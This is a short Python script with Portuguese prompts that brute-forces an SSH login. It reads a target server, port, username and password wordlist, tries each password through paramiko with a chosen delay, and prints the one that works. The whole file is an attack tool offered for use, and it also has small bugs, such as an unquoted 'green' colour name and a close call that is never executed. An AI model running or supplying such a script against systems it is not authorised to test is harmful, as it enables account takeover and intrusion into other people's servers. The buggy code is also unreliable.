#!/usr/bin/python3
import paramiko,sys
from termcolor import colored
from time import *

servidor = input(colored("Digite o servidor: ",'blue')) 
porta = input(colored("digite a porta do serviço ssh: ",'magenta'))
nome = input(colored("Digite O user: ",'yellow'))
wl = input(colored("Digite a wordlist do password: ",'red'))
t = input(colored("IFORME O TEMPO DE EXECUÇÃO ENTRE CADA REQUISIÇÃO:",'green'))
tempo = int(t)

ssh = paramiko.SSHClient()
ssh.load_system_host_keys()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

f= open(wl)
for palavra in f.readlines():
	senha = palavra.strip()
	try:
		ssh.connect(servidor,port=porta,username=nome,password=senha)
	except paramiko.ssh_exception.AuthenticationException:
		print (colored("Testando senha:",'red') ,senha)
		
		sleep(tempo)
	else:
		print (colored("[+++]senha encontrada >>>>",green),senha)
		break
ssh.close
